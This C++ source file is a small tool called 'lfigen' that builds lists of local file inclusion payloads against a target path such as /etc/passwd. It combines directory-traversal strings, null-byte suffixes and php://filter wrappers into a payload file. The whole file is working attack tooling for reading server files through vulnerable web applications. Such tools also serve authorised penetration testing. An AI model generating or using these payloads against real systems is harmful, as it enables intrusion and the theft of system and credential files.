#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <set>

using namespace std;

set<string> generate(char* dir);
void save_to_file(set<string>& the_payloads, char* file_name);

int main(int argc, char* argv[]) {
    if (argc != 3) {
        cout << "lfigen v1.1 a simple tool that generates LFI payloads based on your target file/directory.\n";
        cout << "Example: " << argv[0] << " {file/path} {output_filename}\n";
        cout << "2nd Example: " << argv[0] << "/etc/passwd payload.txt\n";

        return -1;
    }
    
    set<string> the_payloads = generate(argv[1]);

    save_to_file(the_payloads, argv[2]);

    return 0;
}

set<string> generate(char* dir) {
    set<string> new_payloads;
    string cdir(dir);
    int config;

    if (cdir.rfind("/", 0) == 0) {
        config = 1;
    }
    else {
        config = 0;
    }

   const char* payloads1[] = {
        "/..",
        "/../.",
        "/../..",
        "/../.",
        "/../../..",
        "/../../.",
        "/..//..//..//..//..//..//..//..",
        "/..\\\\..\\",
        "/../../../../../../../../../../../../..",
        "/..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\",
        "/../../../../../../../..",
        "/........................................................................../../../../../../../..",
        "/..........................................................................\\..\\..\\..",
        "/../../../..", 
        "/../../../../..",
        "..///////..////../////",
        };
    const char* payloads2[] = {
        "..",                                        
        "../.",                                      
        "../..",                                     
        "../.",                                      
        "../../..",                                   
        "../../.",                                   
        "..//..//..//..//..//..//..//..",              
        "..\\\\..\\",                                
        "../../../../../../../../../../../../..",   
        "..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\",   
        "../../../../../../../..",                  
        "........................................................................../../../../../../../..",  
        "..........................................................................\\..\\..\\..",               
        "../../../..",                               
        "../../../../..", 
        "..///////..////../////",                              
        };

    const char* filter_payloads[] = {
        "php://filter/string.toupper/string.rot13/string.tolower/resource=",
        "php://filter/convert.base64-encode/resource=",
    };

    if (config == 1) {
        string full_file = cdir;

        for (auto payload1 : payloads1) {
            for (auto payload2 : payloads2) {
                string standard_payload = payload1 + full_file;
                string standard_payload2 = payload2 + full_file;

                new_payloads.insert(standard_payload2);
                new_payloads.insert(standard_payload2 + "%00");
                new_payloads.insert(standard_payload);
                new_payloads.insert(standard_payload + "%00");

                for (auto payload3 : filter_payloads) {
                    string filter_payload = payload3 + standard_payload;
                    new_payloads.insert(filter_payload);
                    new_payloads.insert(filter_payload + "%00");
                }
            }
        }
    }
    else {
        string full_file = "/" + cdir;

        for (auto payload1 : payloads1) {
            for (auto payload2 : payloads2) {
                string standard_payload = payload1 + full_file;
                string standard_payload2 = payload2 + full_file;

                new_payloads.insert(standard_payload2);
                new_payloads.insert(standard_payload2 + "%00");
                new_payloads.insert(standard_payload);
                new_payloads.insert(standard_payload + "%00");

                for (auto payload3 : filter_payloads) {
                    string filter_payload = payload3 + standard_payload;
                    new_payloads.insert(filter_payload);
                    new_payloads.insert(filter_payload + "%00");
                }
            }
        }
    }

    return new_payloads;
}

void save_to_file(set<string>& the_payloads, char* file_name) {
    ofstream PayloadFile(file_name, ios::trunc);

    ifstream The_Check;

    for (const string& payload : the_payloads) {
        PayloadFile << payload << "\n";
    }

    PayloadFile.close();

    cout << "[+] Saved payloads to " << file_name << endl;
}
